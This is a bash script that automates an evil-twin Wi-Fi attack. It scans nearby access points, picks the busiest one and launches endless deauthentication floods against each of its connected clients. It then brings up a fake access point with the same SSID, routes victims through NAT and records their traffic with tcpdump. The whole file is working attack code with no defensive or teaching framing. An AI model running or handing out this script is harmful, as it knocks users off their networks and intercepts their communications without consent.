#!/bin/bash
# Scan all AP around us
interface="$1" #wlan0
monitor_interface="$2" #wlan0mon
channel="$3" #11

sudo apt install dnsmasq -y
sudo apt install gnome-terminal -y
sudo apt install hostapd -y

clear

sudo airmon-ng stop $monitor_interface

sudo airmon-ng check kill

sudo airmon-ng start $interface

sudo timeout -s 2 25 airodump-ng -c 11 $monitor_interface -w scan & sleep 26


sudo rm scan-01.cap & sudo rm scan-01.csv & sudo rm scan-01.kismet.netxml

maxData=0
finalName=""
finalMAC=""
finalChannel=0

input="scan-01.kismet.csv"
#Delete first line of the file (without data)
sed -i '1d' $input
#Read each line
while IFS= read -r line
do
  #Parse the given line and put every datas in an array
  IFS=';' read -ra ARRAY <<< "$line"

  if [ "${ARRAY[13]}" -gt "$maxData" ] ; then
    maxData="${ARRAY[13]}"
    finalName="${ARRAY[2]}"
    finalMAC="${ARRAY[3]}"
    finalChannel="${ARRAY[5]}"

  fi


done < "$input"

echo "$maxData"
echo "$finalName"
echo "$finalMAC"

#Deauth all users of the selected AP until the end of the script

sudo airmon-ng start $interface

sudo timeout -s 2 40 airodump-ng -c $channel $monitor_interface --bssid $finalMAC -a -w device & sleep 41

#Delete line 1 to 5 (useless lines, without data wanted)
sed -i '1,5d' device-01.csv

sed -i '$d' device-01.csv

#Automatically change the channel of the fake AP to match with the original
#sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf


#Death each user of the AP attacked

while IFS= read -r line
do
  #Parse the given line and put every datas in an array
  IFS=',' read -ra ARRAY <<< "$line"

  sudo gnome-terminal -- bash -c "aireplay-ng --deauth 0 -a $finalMAC -c ${ARRAY[0]} $monitor_interface ; exec bash"


done < "device-01.csv"


sudo systemctl restart NetworkManager

# Creation of our AP
sudo airmon-ng stop $monitor_interface

sed -i "5s/.*/ssid="$finalName"/" hostconf.conf


#Turn sytem on forwarding mode
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
cat /proc/sys/net/ipv4/ip_forward
echo "Echo 1 OK"

#Setup internet route for user, configure firewall
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo "iptables OK"

#Add ip to WLan0
sudo ip addr add 192.168.1.1/24 dev $interface
echo "ip add OK"

#Execute hostapd on another terminal
sudo gnome-terminal -- bash -c "sudo hostapd hostconf.conf ; exec bash"

sudo rm scan-01.kismet.csv
sudo rm scan-01.log.csv

#Exec dnsmasq on another terminal to setup dhcp
sudo gnome-terminal -- bash -c "sudo dnsmasq -d -C host.conf ; exec bash"

sudo tcpdump -i $interface -s 65535 -w traffic.pcap

sudo rm device-01.cap & sudo rm device-01.csv & sudo rm device-01.kismet.netxml & sudo rm device-01.kismet.csv & sudo rm device-01.log.csv
